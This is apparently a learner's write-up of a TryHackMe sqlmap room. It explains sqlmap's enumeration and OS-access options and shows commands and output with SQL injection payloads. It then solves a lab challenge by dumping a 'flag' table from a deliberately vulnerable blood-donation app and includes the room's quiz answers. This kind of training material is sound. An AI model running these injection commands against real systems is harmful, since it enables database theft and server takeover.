# SQLMAP

Room: [SQLMAP](https://tryhackme.com/room/sqlmap)

<img width="944" height="203" alt="image" src="https://github.com/user-attachments/assets/f58c0b47-977b-4ef7-8b6e-f351b372e9f2" />

## Introduction

### What is sqlmap? 

sqlmap is an open source penetration testing tool developed by Bernardo Damele Assumpcao Guimaraes and Miroslav Stampar that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches lasting from database fingerprinting, fetching data from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.

---

### Installing Sqlmap

If you're using Kali Linux, sqlmap is pre-installed. Otherwise, you can download it here: [sqlmap repo](https://github.com/sqlmapproject/sqlmap)

## Using Sqlmap

### Sqlmap Commands

To show the basic help menu, simply type `sqlmap -h` in the terminal.

<img width="430" height="359" alt="image" src="https://github.com/user-attachments/assets/4aba52e6-525b-4bc9-aa39-ad1e49dee822" />

**Basic commands**:

| **Option** | **Description** |
|---|---|
| `-u URL, --url=URL` | Target URL (e.g. `http://www.site.com/vuln.php?id=1`) |
| `--data=DATA` | Data string to be sent through POST (e.g. `id=1`) |
| `--random-agent` | Use randomly selected HTTP User-Agent header value |
| `-p TESTPARAMETER` | Testable parameter(s) |
| `--level=LEVEL` | Level of tests to perform (1-5, default 1) |
| `--risk=RISK` | Risk of tests to perform (1-3, default 1) |

**Enumeration commands**:

These options can be used to enumerate the back-end database management system information, structure, and data contained in tables.

| Options | Description |
| :--- | :--- |
| `-a`, `--all` | Retrieve everything |
| `-b`, `--banner` | Retrieve DBMS banner |
| `--current-user` | Retrieve DBMS current user |
| `--current-db` | Retrieve DBMS current database |
| `--passwords` | Enumerate DBMS users password hashes |
| `--dbs` | Enumerate DBMS databases |
| `--tables` | Enumerate DBMS database tables |
| `--columns` | Enumerate DBMS database table columns |
| `--schema` | Enumerate DBMS schema |
| `--dump` | Dump DBMS database table entries |
| `--dump-all` | Dump all DBMS databases tables entries |
| `--is-dba` | Detect if the DBMS current user is DBA |
| `-D <DB NAME>` | DBMS database to enumerate |
| `-T <TABLE NAME>` | DBMS database table(s) to enumerate |
| `-C COL` | DBMS database table column(s) to enumerate |

**Operating System access commands**

These options can be used to access the back-end database management system on the target operating system.

| **Option** | **Description** |
|---|---|
| `--os-shell` | Prompt for an interactive operating system shell |
| `--os-pwn` | Prompt for an OOB shell, Meterpreter or VNC |
| `--os-cmd=OSCMD` | Execute an operating system command |
| `--priv-esc` | Database process user privilege escalation |
| `--os-smbrelay` | One-click prompt for an OOB shell, Meterpreter or VNC |

An OOB shell is a shell connection where the communication between the target machine and the attacker happens through a separate channel, rather than through the original web request.

VNC stands for Virtual Network Computing. It allows you to remotely control another computer's graphical desktop over a network.

For a more extensive list of options, run `sqlmap -hh` to display the advanced help message.

**Simple HTTP GET Based Test**

`sqlmap -u https://testsite.com/page.php?id=7 --dbs`

Here we have used two flags: `-u` to state the vulnerable URL and `--dbs` to enumerate the database.

**Simple HTTP POST Based Test**

First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.

<img width="738" height="635" alt="image" src="https://github.com/user-attachments/assets/214ddd22-a1e1-458b-b02f-c4ca3e956104" />

You’ll notice in the request above, we have a POST parameter `blood_group` which could a vulnerable parameter.

Now that we’ve identified a potentially vulnerable parameter, let’s jump into the sqlmap and use the following command: `sqlmap -r req.txt -p blood_group --dbs`

`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`

Here we have used three flags: `-r` to read the file, `-p` to supply the vulnerable parameter, and `--dbs` to enumerate the database.

```
nare@nare$ sqlmap -r req.txt -p blood_group --dbs
[19:31:39] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:31:50] [INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:33:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:33:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:33:09] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[19:33:09] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')
[19:33:10] [WARNING] reflective value(s) found and filtering out
[19:33:12] [INFO] target URL appears to be UNION injectable with 8 columns
[19:33:13] [INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'blood_group' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:33:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:33:17] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

Now that we have the databases, let's extract tables from the database `blood`.

**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`

**Using POST based Method**

`sqlmap -r req.txt -p blood_group -D blood --tables`

`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`

Once we run these commands, we should get the tables.

```
nare@nare$ sqlmap -r req.txt -p blood_group -D blood --tables
[19:35:57] [INFO] parsing HTTP request from 'req.txt'
[19:35:57] [INFO] resuming back-end DBMS 'mysql'
[19:35:57] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a767a71,0x58784e494a4c43546361475a45546c676e736178584f517a457070784c616b4849414c69594c6371,0x71716a7a71)-- -
---
[19:35:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[19:35:58] [INFO] fetching tables for database: 'blood'
[19:35:58] [WARNING] reflective value(s) found and filtering out
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

Once we have available tables, now let’s gather the columns from the table blood_db.

**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`

**Using POST based Method**

`sqlmap -r req.txt -D blood -T blood_db --columns`

`sqlmap -r req.txt -D <database_name> -T <table_name> --columns`

Or we can simply dump all the available databases and tables using the following commands.

**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all`

`sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`

**Using POST based Method**

`sqlmap -r req.txt -D <database_name> --dump-all`

`sqlmap -r req.txt-p  -D <database_name> --dump-all`

---

### Answer the questions below

1. Which flag or option will allow you to add a URL to the command?

`-u`

2. Which flag would you use to add data to a POST request?

`--data`

3. There are two parameters: username and password. How would you tell sqlmap to use the username parameter for the attack?

`-p username`

4. Which flag would you use to show the advanced help menu?

`-hh`

5. Which flag allows you to retrieve everything?

`-a`

6. Which flag allows you to select the database name?

`-D`

7. Which flag would you use to retrieve database tables?

`--tables`

8. Which flag allows you to retrieve a table’s columns?

`--columns`

9. Which flag allows you to dump all the database table entries?

`--dump-all`

10. Which flag will give you an interactive SQL Shell prompt?

`--sql-shell`

11. You know the current db type is 'MYSQL'. Which flag allows you to enumerate only MySQL databases?

`--dbms=mysql`

## SQLMap Challenge

Deploy the machine attached to this task, then navigate to `MACHINE_IP`

<img width="291" height="124" alt="image" src="https://github.com/user-attachments/assets/9608cdec-a5f2-4595-ab96-2cce46f8881e" />

I am using my Kali Linux Machine and connecting through OpenVPN Command: `sudo openvpn FILENAME`

You can see how to connect to TryHackMe by this room: [OpenVPN](https://tryhackme.com/room/openvpn)

**Task:**

We have deployed an application to collect **Blood Donations**. The request seems to be vulnerable.

Exploit a SQL Injection vulnerability on the vulnerable application to find the flag.

---

### Answer the questions below

1. What is the name of the interesting directory ?

`blood`

To find directories we can use the `gobuster` command to find these.

Our guess is it would be related to **Blood Donations** as application name it is.

I first tried the common wordlist, but did not get good results, so using the `dirbuster` medium wordlist: `gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100`

<img width="574" height="175" alt="image" src="https://github.com/user-attachments/assets/7544c623-fac0-431a-a544-a2e57efd00d0" />

Navigating to the `blood` directory `http://MACHINE_IP/blood/`

<img width="740" height="334" alt="image" src="https://github.com/user-attachments/assets/f4f870a0-6d8d-4da4-9ae7-43a940326538" />

2. Who is the current db user?

`root`

Now we need to see any parameter through which we can gather information about the databases.

We see Login and Register on this page, so going to Register so we can see the Dashboard.

<img width="627" height="289" alt="image" src="https://github.com/user-attachments/assets/d0a06bb8-4b3f-499f-aedb-22300aa95931" />

We see three buttons with emojis, one of them is to Submit Donor Information and one where we see other Donor's information.

I submitted some information in the "Submit Donor Information" and then checked the Donor's list so I see my information also.

<img width="623" height="205" alt="image" src="https://github.com/user-attachments/assets/f6d3d41a-7ad2-4b9d-8573-554a5a147f9d" />

I clicked the Actions button of the first Donor Nare, so I see his information.

<img width="776" height="332" alt="image" src="https://github.com/user-attachments/assets/80a5a2b6-9269-4af2-a98b-6355c9f1f141" />

You see the URL `http://MACHINE_IP/blood/view.php?id=1` and when I do `id=2` it shows my information.

Adding little `'` in the parameter we get Database info that it is MySQL.

<img width="596" height="320" alt="image" src="https://github.com/user-attachments/assets/833765e3-c53f-4a15-ad54-63669fe36b67" />

Now using Burp Suite, to capture this request, so choose the Proxy section with Intercept on to get the request.

Save the request by selecting **Save item** by right clicking and I am naming it `get_blood`

We can get the current user by command: `sqlmap -r get_blood --current-user`

<img width="395" height="275" alt="image" src="https://github.com/user-attachments/assets/888e7bed-f5aa-43f1-a946-34a44ce824b8" />

3. What is the final flag? 

Using `sqlmap` command to find the databases: `sqlmap -r get_blood --dbs`

<img width="859" height="284" alt="image" src="https://github.com/user-attachments/assets/7084c700-e897-4c38-8516-5af2583cfb9c" />

After couple scans it says that `id` parameter is vulnerable, so do we want to try other tests so I chose `N` as we can exploit this parameter to know about the databases. So finally get the databases.

<img width="862" height="320" alt="image" src="https://github.com/user-attachments/assets/a2848db2-ae3a-4f79-a03c-7c4e15ad59c9" />

So now we are interested in the `blood` database, so now looking for tables in this database: `sqlmap -r get_blood -D blood --tables`

<img width="391" height="251" alt="image" src="https://github.com/user-attachments/assets/65f89ca0-758f-4a15-9415-86545a332673" />

We are interested in `flag` table so now finding the columns: `sqlmap -r get_blood -D blood -T flag --columns`

<img width="580" height="199" alt="image" src="https://github.com/user-attachments/assets/3b892800-420e-4d23-b2ec-8735604d44ff" />

Now dumping all the information in the `flag` table: `sqlmap -r get_blood -D blood -T flag --dump`

<img width="870" height="430" alt="image" src="https://github.com/user-attachments/assets/4324face-fdaa-483a-aa86-3ca9c6f8fb4d" />
















 
